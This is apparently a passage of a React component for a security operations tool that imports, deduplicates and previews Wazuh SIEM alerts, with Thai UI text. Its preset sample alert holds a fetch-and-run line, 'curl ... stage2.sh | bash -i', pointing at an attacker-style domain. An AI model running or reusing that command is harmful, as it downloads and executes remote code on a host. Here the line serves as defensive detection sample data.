import React, { useEffect, useState } from 'react';
import {
  Upload,
  FileJson,
  FileSpreadsheet,
  Sparkles,
  CheckCircle2,
  AlertCircle,
  Radio,
  History,
  Fingerprint,
  PenTool,
  ArrowRight,
} from 'lucide-react';
import { SecurityAlert } from '../types';
import {
  ingestCsvAlerts,
  ingestJsonAlerts,
  seedDemoDatasets,
} from '../services/api';
import { formatThaiDateTime } from '../utils/formatDateTime';

interface ImportHistoryItem {
  id: string;
  timestamp: string;
  sourceType: 'Wazuh Connector' | 'JSON Upload' | 'CSV Upload' | 'Standard Dataset';
  filename: string;
  totalCount: number;
  ingestedCount: number;
  deduplicatedCount: number;
  failedCount: number;
  dedupDetails: string;
  status: 'SUCCESS' | 'PARTIAL_SUCCESS' | 'FAILED';
}

const PRESET_WAZUH_JSON = JSON.stringify(
  {
    id: 'wazuh-live-9901',
    timestamp: new Date().toISOString(),
    agent: {
      id: '009',
      name: 'prod-k8s-worker-04',
      ip: '10.20.8.44',
    },
    rule: {
      id: '92104',
      level: 14,
      description:
        'Unauthorized container escape attempt and reverse shell execution connecting to known C2.',
      mitre: {
        id: ['T1059.001', 'T1105'],
      },
    },
    data: {
      srcip: '10.20.8.44',
      dstip: '91.215.85.142',
      domain: 'update-telemetry-cdn.ru',
      srcuser: 'root',
      process: 'bash',
      command_line: 'curl -s http://update-telemetry-cdn.ru/stage2.sh | bash -i',
      file_hash: '44d88612fea8a8f36de82e1278abb02f',
    },
    full_log:
      'Auditd EXECVE: root executed curl -s http://update-telemetry-cdn.ru/stage2.sh | bash on prod-k8s-worker-04',
  },
  null,
  2
);

export const IngestPage: React.FC<{
  alerts: SecurityAlert[];
  workspaceId?: string;
  userEmail?: string;
  onIngestSuccess: () => void;
  onSelectEventForDetails?: (alert: SecurityAlert) => void;
}> = ({ alerts, workspaceId, userEmail, onIngestSuccess, onSelectEventForDetails }) => {
  const [jsonInput, setJsonInput] = useState(PRESET_WAZUH_JSON);
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState<{ type: 'success' | 'error'; text: string } | null>(null);
  const [validationPreview, setValidationPreview] = useState<string | null>(null);

  // ฟอร์มกรอกข้อมูล Alert ด้วยตนเอง (Manual Alert Entry)
  const [manualSource, setManualSource] = useState('Wazuh');
  const [manualRuleId, setManualRuleId] = useState('5712');
  const [manualRuleLevel, setManualRuleLevel] = useState(12);
  const [manualHostname, setManualHostname] = useState('prod-web-srv-01');
  const [manualSrcIp, setManualSrcIp] = useState('185.220.101.45');
  const [manualDstIp, setManualDstIp] = useState('10.20.1.15');
  const [manualDesc, setManualDesc] = useState(
    'Multiple failed SSH login attempts followed by suspicious command execution'
  );
  const [manualRawLog, setManualRawLog] = useState(
    'Nov 25 14:22:01 prod-web-srv-01 sshd[1924]: Failed password for root from 185.220.101.45 port 54120 ssh2'
  );

  const handleManualAlertSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setMessage(null);
    if (!manualDesc.trim()) {
      setMessage({ type: 'error', text: 'กรุณากรอกรายละเอียดเหตุการณ์ (Event Description)' });
      return;
    }
    try {
      setLoading(true);
      const manualPayload = {
        id: `manual-${Date.now()}`,
        timestamp: new Date().toISOString(),
        source: manualSource,
        agent: { id: '099', name: manualHostname.trim() || 'manual-host', ip: manualDstIp.trim() },
        rule: {
          id: manualRuleId.trim() || '10001',
          level: Number(manualRuleLevel) || 10,
          description: manualDesc.trim(),
        },
        data: {
          srcip: manualSrcIp.trim(),
          dstip: manualDstIp.trim(),
          srcuser: 'root',
        },
        full_log: manualRawLog.trim() || manualDesc.trim(),
      };
      const res = await ingestJsonAlerts(
        manualPayload,
        workspaceId,
        'Manual Alert Form Input',
        userEmail
      );
      addHistory(
        'JSON Upload',
        'กรอกข้อมูล Alert ด้วยตนเอง (Manual Form)',
        res.ingested_count,
        res.deduplicated_count
      );
      setMessage({
        type: 'success',
        text: `บันทึกและวิเคราะห์เหตุการณ์ที่กรอกด้วยตนเองสำเร็จ! (${res.ingested_count} New Events)`,
      });
      onIngestSuccess();
      if (res.alerts && res.alerts[0] && onSelectEventForDetails) {
        onSelectEventForDetails(res.alerts[0]);
      }
    } catch (err: unknown) {
      setMessage({
        type: 'error',
        text: err instanceof Error ? err.message : 'ไม่สามารถวิเคราะห์ข้อมูลที่กรอกได้',
      });
    } finally {
      setLoading(false);
    }
  };

  const handleValidateBeforeImport = () => {
    setMessage(null);
    try {
      const parsed = JSON.parse(jsonInput);
      const items = Array.isArray(parsed) ? parsed : [parsed];
      let validCount = 0;
      let duplicateCount = 0;
      const duplicateLabels: string[] = [];

      for (const item of items) {
        const ruleObj = typeof item?.rule === 'object' ? item.rule : {};
        const agentObj = typeof item?.agent === 'object' ? item.agent : {};
        const dataObj = typeof item?.data === 'object' ? item.data : {};

        const desc = ruleObj?.description || item?.description || item?.message || item?.title;
        if (desc && String(desc).trim().length > 0) validCount++;

        const extId = String(
          item?.id || item?.event_id || item?.alert_id || item?.external_id || ''
        ).trim();
        const ruleId = String(ruleObj?.id || item?.rule_id || 'RULE-GEN').trim().toLowerCase();
        const hostname = String(
          agentObj?.name || item?.hostname || dataObj?.hostname || 'unknown-host'
        )
          .trim()
          .toLowerCase();
        const srcIp = String(
          dataObj?.srcip || dataObj?.src_ip || item?.src_ip || item?.srcip || agentObj?.ip || ''
        )
          .trim()
          .toLowerCase();
        const descNorm = String(desc || '').trim().toLowerCase();

        // Check Event ID match OR unique Event Fingerprint match against existing alerts
        const matchedAlert = alerts.find((existing) => {
          if (extId && existing.external_id && existing.external_id.toLowerCase() === extId.toLowerCase()) {
            return true;
          }
          return (
            (existing.rule_id || '').toLowerCase() === ruleId &&
            (existing.hostname || '').toLowerCase() === hostname &&
            (existing.src_ip || '').toLowerCase() === srcIp &&
            (existing.description || '').toLowerCase() === descNorm
          );
        });

        if (matchedAlert) {
          duplicateCount++;
          duplicateLabels.push(
            `${matchedAlert.alert_code} (Event ID: ${extId || matchedAlert.external_id || 'Fingerprint Match'})`
          );
        }
      }

      if (validCount === items.length && items.length > 0) {
        const newEventsCount = items.length - duplicateCount;
        if (duplicateCount > 0) {
          setValidationPreview(
            `⚠ ระบบ Deduplication ตรวจพบข้อมูลซ้ำ ${duplicateCount} รายการ (${duplicateLabels.join(
              ', '
            )}) · จะนำเข้าเป็น ${newEventsCount} New Events และข้ามรายการซ้ำเพื่อไม่ให้สร้าง Alert เดิมซ้ำ`
          );
        } else {
          setValidationPreview(
            `✓ ตรวจสอบข้อมูลและ Deduplication ผ่าน (Valid): พบ ${validCount} New Events (ไม่ซ้ำกับ Event ID หรือข้อมูลเดิมในระบบ) พร้อมนำเข้าทันที`
          );
        }
      } else {
        setValidationPreview(
          `⚠ พบข้อมูลไม่สมบูรณ์: มีรายการที่ผ่านเกณฑ์ ${validCount}/${items.length} รายการ (ต้องระบุฟิลด์ description หรือ rule.description)`
        );
      }
    } catch (err: unknown) {
      setValidationPreview(
        `✗ รูปแบบ JSON ไม่ถูกต้อง: ${err instanceof Error ? err.message : 'Syntax Error'}`
      );
    }
  };

  const [history, setHistory] = useState<ImportHistoryItem[]>([]);

  const [latestResult, setLatestResult] = useState<{
    totalEvents: number;
    newEvents: number;
    duplicatedEvents: number;
    failedEvents: number;
    status: 'SUCCESS' | 'PARTIAL_SUCCESS' | 'FAILED';
    filename: string;
  } | null>(null);

  // ล้างผลลัพธ์การนำเข้าและประวัติชั่วคราวอัตโนมัติเมื่อ End Session ลบข้อมูล Alert จนหมด
  useEffect(() => {
    if (alerts.length === 0) {
      setHistory([]);
      setLatestResult(null);
      setMessage(null);
      setValidationPreview(null);
    }
  }, [alerts.length]);

  const addHistory = (
    sourceType: ImportHistoryItem['sourceType'],
    filename: string,
    ingestedCount: number,
    deduplicatedCount: number,
    dedupDetails = 'ตรวจสอบ Event ID & SHA-256 Fingerprint',
    status: 'SUCCESS' | 'PARTIAL_SUCCESS' | 'FAILED' = 'SUCCESS',
    failedCount = 0
  ) => {
    const totalCount = ingestedCount + deduplicatedCount + failedCount;
    setLatestResult({
      totalEvents: totalCount,
      newEvents: ingestedCount,
      duplicatedEvents: deduplicatedCount,
      failedEvents: failedCount,
      status,
      filename,
    });
    setHistory((prev) => [
      {
        id: `IMP-000${prev.length + 1}`,
        timestamp: formatThaiDateTime(new Date()),
        sourceType,
        filename,
        totalCount,
        ingestedCount,
        deduplicatedCount,
        failedCount,
        dedupDetails,
        status,
      },
      ...prev,
    ]);
  };

  const handleWazuhSync = async () => {
    setMessage(null);
    try {
      setLoading(true);
      const liveWazuhEvent = {
        id: `wazuh-agent-${Date.now()}`,
        timestamp: new Date().toISOString(),
        agent: { id: '001', name: 'wazuh-prod-gateway-01', ip: '10.20.1.50' },
        rule: {
          id: '5712',
          level: 13,
          description: `Wazuh Live Telemetry: SSH Brute Force & Credential Stuffing detected [Batch #${Math.floor(
            Math.random() * 900 + 100
          )}]`,
          mitre: { id: ['T1110'] },
        },
        data: {
          srcip: '185.220.101.45',
          dstip: '10.20.1.50',
          srcuser: 'root',
          protocol: 'SSH',
        },
        full_log:
          'Wazuh Agent [001] sshd: 64 failed password attempts for root from 185.220.101.45 port 51204 ssh2',
      };
      const res = await ingestJsonAlerts(
        liveWazuhEvent,
        workspaceId,
        `Wazuh Live Stream (${liveWazuhEvent.id})`,
        userEmail
      );
      addHistory(
        'Wazuh Connector',
        `Wazuh Agent Live Stream (Event ID: ${liveWazuhEvent.id})`,
        res.ingested_count,
        res.deduplicated_count,
        res.deduplicated_count > 0
          ? `Event ID / Fingerprint ซ้ำ (${res.deduplicated_count} Duplicate Events)`
          : 'Event ID & SHA-256 Verified (0 Duplicates)'
      );
      setMessage({
        type: 'success',
        text: `ดึงข้อมูลสดจาก Wazuh สำเร็จ! นำเข้า ${res.ingested_count} New Events (ตรวจพบข้อมูลซ้ำ Deduplicated ${res.deduplicated_count} Events)`,
      });
      onIngestSuccess();
    } catch (err: unknown) {
      setMessage({
        type: 'error',
        text: err instanceof Error ? err.message : 'ไม่สามารถเชื่อมต่อ Wazuh ได้',
      });
    } finally {
      setLoading(false);
    }
  };

  const handleJsonSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setMessage(null);
    try {
      setLoading(true);
      const parsed = JSON.parse(jsonInput);
      const res = await ingestJsonAlerts(
        parsed,
        workspaceId,
        'Manual JSON Payload',
        userEmail
      );
      addHistory(
        'JSON Upload',
        'Manual JSON Payload',
        res.ingested_count,
        res.deduplicated_count,
        res.deduplicated_count > 0
          ? `ข้าม Alert ซ้ำจาก Event ID / SHA-256 (${res.deduplicated_count} รายการ)`
          : 'Event ID & SHA-256 Verified (0 Duplicates)'
      );
      setMessage({
        type: 'success',
        text:
          res.deduplicated_count > 0 && res.ingested_count === 0
            ? `ระบบ Deduplication ตรวจพบ Event ID หรือข้อมูลเฉพาะของ Event ซ้ำกับที่มีในระบบแล้ว (${res.deduplicated_count} Duplicate Events) — ป้องกันการนำ Alert เดิมเข้าระบบซ้ำเรียบร้อยแล้ว (0 New Events)`
            : `นำเข้า JSON สำเร็จ! เพิ่ม ${res.ingested_count} New Events (ระบบ Deduplication ข้ามข้อมูลซ้ำ ${res.deduplicated_count} Events)`,
      });
      onIngestSuccess();
    } catch (err: unknown) {
      addHistory('JSON Upload', 'Invalid JSON Payload', 0, 0, 'Syntax / Schema Error', 'FAILED', 1);
      setMessage({
        type: 'error',
        text: err instanceof Error ? err.message : 'รูปแบบ JSON ไม่ถูกต้อง หรือข้อมูลไม่ครบถ้วน',
      });
    } finally {
      setLoading(false);
    }
  };

  const handleJsonFileUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    setMessage(null);
    try {
      setLoading(true);
      const text = await file.text();
      setJsonInput(text);
      const parsed = JSON.parse(text);
      const res = await ingestJsonAlerts(parsed, workspaceId, file.name, userEmail);
      addHistory(
        'JSON Upload',
        file.name,
        res.ingested_count,
        res.deduplicated_count,
        res.deduplicated_count > 0
          ? `ข้าม Alert ซ้ำจาก Event ID / SHA-256 (${res.deduplicated_count} รายการ)`
          : 'Event ID & SHA-256 Verified (0 Duplicates)'
      );
      setMessage({
        type: 'success',
        text: `อัปโหลดไฟล์ JSON (${file.name}) สำเร็จ! นำเข้า ${res.ingested_count} New Events (ตรวจพบข้อมูลซ้ำ Deduplicated ${res.deduplicated_count} Events)`,
      });
      onIngestSuccess();
    } catch (err: unknown) {
      addHistory('JSON Upload', file.name, 0, 0, 'Invalid JSON File', 'FAILED', 1);
      setMessage({
        type: 'error',
        text: err instanceof Error ? err.message : 'ไม่สามารถอ่านไฟล์ JSON ได้',
      });
    } finally {
      setLoading(false);
      e.target.value = '';
    }
  };

  const handleCsvUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    setMessage(null);
    try {
      setLoading(true);
      const res = await ingestCsvAlerts(file, workspaceId, userEmail);
      addHistory(
        'CSV Upload',
        file.name,
        res.ingested_count,
        res.deduplicated_count,
        res.deduplicated_count > 0
          ? `ข้าม Alert ซ้ำจาก Event ID / SHA-256 (${res.deduplicated_count} รายการ)`
          : 'Event ID & SHA-256 Verified (0 Duplicates)'
      );
      setMessage({
        type: 'success',
        text: `อัปโหลดไฟล์ CSV (${file.name}) สำเร็จ! นำเข้า ${res.ingested_count} New Events (ตรวจพบข้อมูลซ้ำ Deduplicated ${res.deduplicated_count} Events)`,
      });
      onIngestSuccess();
    } catch (err: unknown) {
      addHistory('CSV Upload', file.name, 0, 0, 'Invalid CSV File', 'FAILED', 1);
      setMessage({
        type: 'error',
        text: err instanceof Error ? err.message : 'ไม่สามารถประมวลผลไฟล์ CSV ได้',
      });
    } finally {
      setLoading(false);
      e.target.value = '';
    }
  };

  const handleSeedDemo = async () => {
    setMessage(null);
    try {
      setLoading(true);
      const res = await seedDemoDatasets(workspaceId, userEmail);
      addHistory(
        'Standard Dataset',
        'sample_wazuh_alerts.json + sample_security_logs.csv',
        res.ingested_count,
        res.deduplicated_count,
        res.deduplicated_count > 0
          ? `ตรวจพบ Event ID / SHA-256 ซ้ำ ${res.deduplicated_count} รายการ (ป้องกันการนำเข้าซ้ำ)`
          : 'Event ID & SHA-256 Verified (0 Duplicates)'
      );
      setMessage({
        type: 'success',
        text:
          res.deduplicated_count > 0 && res.ingested_count === 0
            ? `ระบบ Deduplication ตรวจพบว่าชุดข้อมูลมาตรฐานทั้ง ${res.deduplicated_count} Events มีอยู่ในระบบแล้ว (ตรวจสอบจาก Event ID และ SHA-256 Fingerprint) จึงป้องกันการนำเข้าซ้ำ (0 New Events)`
            : `โหลดชุดข้อมูลตัวอย่างสำเร็จ! นำเข้า ${res.ingested_count} New Events (ซ้ำ ${res.deduplicated_count} Events)`,
      });
      onIngestSuccess();
    } catch (err: unknown) {
      setMessage({
        type: 'error',
        text: err instanceof Error ? err.message : 'เกิดข้อผิดพลาดในการโหลดข้อมูลตัวอย่าง',
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="space-y-5">
      {/* 1. Wazuh Connection & Import Status Banner */}
      <div className="sylva-glass-card rounded-[26px] p-6 space-y-4">
        <div className="space-y-4">
          <div className="min-w-0">
            <span className="text-[11px] font-bold uppercase tracking-wider text-emerald-700 dark:text-emerald-400 block">
              นำเข้าเหตุการณ์ (Upload Alert — JSON / CSV / กรอกข้อมูลด้วยตนเอง)
            </span>
            <h2 className="text-xl font-extrabold text-slate-900 dark:text-white mt-0.5 leading-snug">
              นำเข้าข้อมูลและเพิ่มเหตุการณ์เพื่อเริ่มวิเคราะห์ (Upload & Input Alerts)
            </h2>
            <p className="text-xs font-medium text-slate-600 dark:text-slate-300 mt-1">
              อัปโหลดไฟล์ JSON / CSV หรือกรอกข้อมูลด้วยตนเอง จากนั้นคลิกเลือกเหตุการณ์เพื่อเปิดดูผลวิเคราะห์ใน <strong>Analysis Workspace</strong> (ระบบจัดการ Session และลบไฟล์ชั่วคราวให้อัตโนมัติอยู่เบื้องหลัง)
            </p>
          </div>

          <div className="flex flex-wrap items-center gap-2.5 pt-3 border-t border-slate-200 dark:border-slate-700/80">
            <button
              onClick={handleWazuhSync}
              disabled={loading}
              className="inline-flex items-center gap-2 px-4 py-2.5 rounded-xl bg-sky-600 hover:bg-sky-500 text-white text-xs font-extrabold shadow-sm transition cursor-pointer whitespace-nowrap"
            >
              <Radio className="w-4 h-4 animate-pulse shrink-0" />
              ดึงข้อมูลสดจาก Wazuh Connector
            </button>
            <button
              onClick={handleSeedDemo}
              disabled={loading}
              className="inline-flex items-center gap-2 px-4 py-2.5 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-extrabold shadow-sm transition cursor-pointer whitespace-nowrap"
            >
              <Sparkles className="w-4 h-4 shrink-0" />
              โหลดชุดข้อมูลมาตรฐาน (12 Alerts)
            </button>
          </div>
        </div>

        {/* Wazuh Connector Status Card */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-3 pt-2">
          <div className="p-3.5 rounded-2xl bg-slate-50 dark:bg-slate-900/80 border border-slate-200 dark:border-slate-700 flex items-center justify-between min-w-0 overflow-hidden">
            <div className="min-w-0">
              <div className="text-[11px] font-bold text-slate-500 dark:text-slate-400 truncate">
                เชื่อมต่อ Wazuh SIEM
              </div>
              <div className="text-xs font-extrabold text-slate-900 dark:text-white mt-0.5 truncate">
                Wazuh REST API / JSON Webhook
              </div>
            </div>
            <span className="px-2.5 py-0.5 rounded-full text-[11px] font-bold bg-emerald-100 text-emerald-800 dark:bg-emerald-500/20 dark:text-emerald-200 border border-emerald-300 dark:border-emerald-400/40 shrink-0">
              READY
            </span>
          </div>

          <div className="p-3.5 rounded-2xl bg-slate-50 dark:bg-slate-900/80 border border-slate-200 dark:border-slate-700 flex items-center justify-between min-w-0 overflow-hidden">
            <div className="min-w-0">
              <div className="text-[11px] font-bold text-slate-500 dark:text-slate-400 truncate flex items-center gap-1">
                <Fingerprint className="w-3.5 h-3.5 text-sky-600 dark:text-sky-400 shrink-0" />
                ระบบ Deduplication ป้องกันข้อมูลซ้ำ
              </div>
              <div className="text-xs font-extrabold text-slate-900 dark:text-white mt-0.5 truncate">
                ตรวจสอบ Event ID + SHA-256 Event Fingerprint
              </div>
            </div>
            <span className="px-2.5 py-0.5 rounded-full text-[11px] font-bold bg-sky-100 text-sky-800 dark:bg-sky-500/20 dark:text-sky-200 border border-sky-300 dark:border-sky-400/40 shrink-0">
              ACTIVE
            </span>
          </div>

          <div className="p-3.5 rounded-2xl bg-slate-50 dark:bg-slate-900/80 border border-slate-200 dark:border-slate-700 flex items-center justify-between min-w-0 overflow-hidden">
            <div className="min-w-0">
              <div className="text-[11px] font-bold text-slate-500 dark:text-slate-400 truncate">
                สถานะการนำเข้าข้อมูลล่าสุด
              </div>
              <div className="text-xs font-extrabold text-slate-900 dark:text-white mt-0.5 truncate">
                บันทึกประวัติการนำเข้าแล้ว {history.length} ครั้ง
              </div>
            </div>
            <span className="px-2.5 py-0.5 rounded-full text-[11px] font-bold bg-purple-100 text-purple-800 dark:bg-purple-500/20 dark:text-purple-200 border border-purple-300 dark:border-purple-400/40 shrink-0">
              SYNCED
            </span>
          </div>
        </div>
      </div>

      {/* Status Alert Banner */}
      {message && (
        <div
          className={`p-4 rounded-2xl border flex items-center gap-3 text-xs font-bold ${
            message.type === 'success'
              ? 'bg-emerald-100 border-emerald-300 text-emerald-900 dark:bg-emerald-500/20 dark:border-emerald-400/40 dark:text-emerald-200'
              : 'bg-rose-100 border-rose-300 text-rose-900 dark:bg-rose-500/20 dark:border-rose-400/40 dark:text-rose-200'
          }`}
        >
          {message.type === 'success' ? (
            <CheckCircle2 className="w-5 h-5 shrink-0" />
          ) : (
            <AlertCircle className="w-5 h-5 shrink-0" />
          )}
          <span>{message.text}</span>
        </div>
      )}

      {/* 2. Upload JSON & Upload CSV Panels */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-5">
        {/* Upload JSON */}
        <form
          onSubmit={handleJsonSubmit}
          className="sylva-glass-card rounded-[26px] p-6 space-y-4"
        >
          <div className="flex items-center justify-between">
            <h3 className="text-sm font-bold text-slate-900 dark:text-white flex items-center gap-2">
              <FileJson className="w-4 h-4 text-emerald-600 dark:text-emerald-400" />
              Upload JSON (ไฟล์ .JSON หรือวาง Wazuh JSON Payload)
            </h3>
            <label className="px-3 py-1 rounded-lg bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 dark:hover:bg-slate-700 text-xs font-bold text-emerald-700 dark:text-emerald-400 border border-slate-300 dark:border-slate-600 cursor-pointer">
              เลือกไฟล์ .JSON
              <input
                type="file"
                accept=".json"
                onChange={handleJsonFileUpload}
                className="hidden"
              />
            </label>
          </div>

          <textarea
            rows={12}
            value={jsonInput}
            onChange={(e) => {
              setJsonInput(e.target.value);
              setValidationPreview(null);
            }}
            className="w-full font-mono text-xs bg-slate-950 text-emerald-300 border border-slate-700 rounded-2xl p-4 focus:outline-none focus:border-emerald-500"
          />

          {validationPreview && (
            <div className="p-3 rounded-xl bg-slate-100 dark:bg-slate-900 border border-slate-300 dark:border-slate-700 text-xs font-bold text-emerald-700 dark:text-emerald-300">
              {validationPreview}
            </div>
          )}

          <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5">
            <button
              type="button"
              onClick={handleValidateBeforeImport}
              className="w-full py-2.5 bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 dark:hover:bg-slate-700 text-slate-900 dark:text-white border border-slate-300 dark:border-slate-600 font-bold text-xs rounded-xl transition cursor-pointer"
            >
              ตรวจสอบข้อมูลก่อนนำเข้า (Validate)
            </button>
            <button
              type="submit"
              disabled={loading}
              className="w-full py-2.5 bg-emerald-600 hover:bg-emerald-500 text-white font-extrabold text-xs rounded-xl transition cursor-pointer shadow-sm"
            >
              {loading ? 'กำลังนำเข้าและวิเคราะห์ด้วย AI...' : 'ยืนยันนำเข้าข้อมูล JSON'}
            </button>
          </div>
        </form>

        {/* Upload CSV */}
        <div className="sylva-glass-card rounded-[26px] p-6 flex flex-col justify-between space-y-4">
          <div className="space-y-3">
            <div className="flex items-center justify-between">
              <h3 className="text-sm font-bold text-slate-900 dark:text-white flex items-center gap-2">
                <FileSpreadsheet className="w-4 h-4 text-sky-600 dark:text-sky-400" />
                Upload CSV (อัปโหลดไฟล์ CSV Security Logs)
              </h3>
              <span className="text-[11px] font-mono text-slate-500 dark:text-slate-400">
                POST /api/alerts/ingest/csv
              </span>
            </div>
            <p className="text-xs font-medium text-slate-600 dark:text-slate-300 leading-relaxed">
              รองรับไฟล์ CSV จาก SIEM, Firewall หรือ Dataset เช่น CICIDS2017 และ Splunk BOTS โดยระบบจะแปลงให้อยู่ในรูปแบบมาตรฐานเดียวกับ Wazuh
            </p>

            <label className="mt-4 border-2 border-dashed border-slate-300 dark:border-slate-700 hover:border-emerald-500 bg-slate-50 dark:bg-slate-900/60 rounded-2xl p-8 flex flex-col items-center justify-center text-center cursor-pointer transition">
              <Upload className="w-10 h-10 text-emerald-600 dark:text-emerald-400 mb-3" />
              <span className="text-sm font-bold text-slate-900 dark:text-white">
                คลิกเพื่อเลือกไฟล์ .CSV สำหรับนำเข้าและวิเคราะห์
              </span>
              <span className="text-xs font-medium text-slate-600 dark:text-slate-400 mt-1">
                สามารถเลือกไฟล์ `datasets/sample_security_logs.csv` ในโปรเจกต์เพื่อทดสอบได้ทันที
              </span>
              <input
                type="file"
                accept=".csv"
                onChange={handleCsvUpload}
                className="hidden"
              />
            </label>
          </div>

          <div className="bg-slate-50 dark:bg-slate-900/70 border border-slate-200 dark:border-slate-700 rounded-2xl p-4 space-y-1.5">
            <h4 className="text-xs font-bold text-slate-800 dark:text-slate-200">
              คอลัมน์ CSV ที่ระบบรองรับ:
            </h4>
            <p className="text-[11px] font-mono font-semibold text-emerald-700 dark:text-emerald-400 break-all">
              timestamp, alert_id, source, rule_id, rule_level, description, src_ip, dst_ip, username, hostname, domain, file_hash, protocol, raw_log
            </p>
          </div>
        </div>
      </div>

      {/* 2.5 กรอกข้อมูล Alert ด้วยตนเอง (Manual Alert Input) & เลือกเหตุการณ์ที่ต้องการวิเคราะห์ */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-5">
        <form
          onSubmit={handleManualAlertSubmit}
          className="lg:col-span-7 sylva-glass-card rounded-[26px] p-6 space-y-4 border-2 border-emerald-500/35"
        >
          <div className="flex items-center justify-between border-b border-slate-200 dark:border-slate-700/80 pb-3">
            <h3 className="text-sm font-extrabold text-slate-900 dark:text-white flex items-center gap-2">
              <PenTool className="w-4 h-4 text-emerald-600 dark:text-emerald-400" />
              กรอกข้อมูล Alert ด้วยตนเอง (Manual Alert Input Form)
            </h3>
            <span className="text-[11px] font-bold text-emerald-700 dark:text-emerald-400">
              วิเคราะห์เหตุการณ์ทีละรายการได้ทันที
            </span>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
            <div>
              <label className="block text-xs font-bold text-slate-700 dark:text-slate-200 mb-1">
                Alert Source
              </label>
              <input
                type="text"
                value={manualSource}
                onChange={(e) => setManualSource(e.target.value)}
                className="w-full px-3 py-2 rounded-xl text-xs font-bold bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 text-slate-900 dark:text-white"
              />
            </div>
            <div>
              <label className="block text-xs font-bold text-slate-700 dark:text-slate-200 mb-1">
                Rule ID
              </label>
              <input
                type="text"
                value={manualRuleId}
                onChange={(e) => setManualRuleId(e.target.value)}
                className="w-full px-3 py-2 rounded-xl text-xs font-mono font-bold bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 text-slate-900 dark:text-white"
              />
            </div>
            <div>
              <label className="block text-xs font-bold text-slate-700 dark:text-slate-200 mb-1">
                Rule Level (1–15)
              </label>
              <input
                type="number"
                min={1}
                max={15}
                value={manualRuleLevel}
                onChange={(e) => setManualRuleLevel(Number(e.target.value))}
                className="w-full px-3 py-2 rounded-xl text-xs font-mono font-bold bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 text-slate-900 dark:text-white"
              />
            </div>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
            <div>
              <label className="block text-xs font-bold text-slate-700 dark:text-slate-200 mb-1">
                Target Hostname
              </label>
              <input
                type="text"
                value={manualHostname}
                onChange={(e) => setManualHostname(e.target.value)}
                className="w-full px-3 py-2 rounded-xl text-xs font-mono font-bold bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 text-slate-900 dark:text-white"
              />
            </div>
            <div>
              <label className="block text-xs font-bold text-slate-700 dark:text-slate-200 mb-1">
                Source IP
              </label>
              <input
                type="text"
                value={manualSrcIp}
                onChange={(e) => setManualSrcIp(e.target.value)}
                className="w-full px-3 py-2 rounded-xl text-xs font-mono font-bold bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 text-slate-900 dark:text-white"
              />
            </div>
            <div>
              <label className="block text-xs font-bold text-slate-700 dark:text-slate-200 mb-1">
                Destination IP
              </label>
              <input
                type="text"
                value={manualDstIp}
                onChange={(e) => setManualDstIp(e.target.value)}
                className="w-full px-3 py-2 rounded-xl text-xs font-mono font-bold bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 text-slate-900 dark:text-white"
              />
            </div>
          </div>

          <div>
            <label className="block text-xs font-bold text-slate-700 dark:text-slate-200 mb-1">
              Event Description (รายละเอียดเหตุการณ์)
            </label>
            <input
              type="text"
              required
              value={manualDesc}
              onChange={(e) => setManualDesc(e.target.value)}
              className="w-full px-3.5 py-2 rounded-xl text-xs font-bold bg-white dark:bg-slate-900 border border-slate-300 dark:border-slate-700 text-slate-900 dark:text-white"
            />
          </div>

          <div>
            <label className="block text-xs font-bold text-slate-700 dark:text-slate-200 mb-1">
              ข้อมูล Log ต้นฉบับ (Raw Log)
            </label>
            <textarea
              rows={2}
              value={manualRawLog}
              onChange={(e) => setManualRawLog(e.target.value)}
              className="w-full px-3.5 py-2 rounded-xl text-xs font-mono bg-slate-950 text-emerald-300 border border-slate-700"
            />
          </div>

          <button
            type="submit"
            disabled={loading}
            className="w-full py-2.5 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-extrabold shadow-sm cursor-pointer"
          >
            {loading ? 'กำลังเริ่มวิเคราะห์...' : 'เริ่มวิเคราะห์เหตุการณ์ที่กรอกนี้ทันที (Analyze Event)'}
          </button>
        </form>

        {/* เลือกเหตุการณ์ที่ต้องการวิเคราะห์ (Select Event to Analyze) */}
        <div className="lg:col-span-5 sylva-glass-card rounded-[26px] p-6 flex flex-col justify-between space-y-4">
          <div className="space-y-3">
            <div className="flex items-center justify-between border-b border-slate-200 dark:border-slate-700/80 pb-3">
              <h3 className="text-sm font-extrabold text-slate-900 dark:text-white">
                เลือกเหตุการณ์ที่ต้องการวิเคราะห์ ({alerts.length} รายการ)
              </h3>
              <span className="text-xs font-bold text-emerald-700 dark:text-emerald-400">
                คลิกเพื่อไปหน้า Analysis Workspace
              </span>
            </div>

            <div className="space-y-2 max-h-[310px] overflow-y-auto pr-1">
              {alerts.slice(0, 8).map((a) => (
                <button
                  key={a.id}
                  type="button"
                  onClick={() => onSelectEventForDetails && onSelectEventForDetails(a)}
                  className="w-full text-left p-3 rounded-2xl bg-slate-50 hover:bg-emerald-50 dark:bg-slate-900/80 dark:hover:bg-slate-800 border border-slate-200 dark:border-slate-700 hover:border-emerald-500 transition cursor-pointer flex items-center justify-between gap-2"
                >
                  <div className="min-w-0">
                    <div className="flex items-center gap-2">
                      <span className="font-mono text-xs font-extrabold text-emerald-700 dark:text-emerald-400">
                        {a.alert_code}
                      </span>
                      <span className="text-[11px] font-mono font-bold text-slate-500">
                        [{a.analysis?.severity}] Score: {a.analysis?.risk_score}
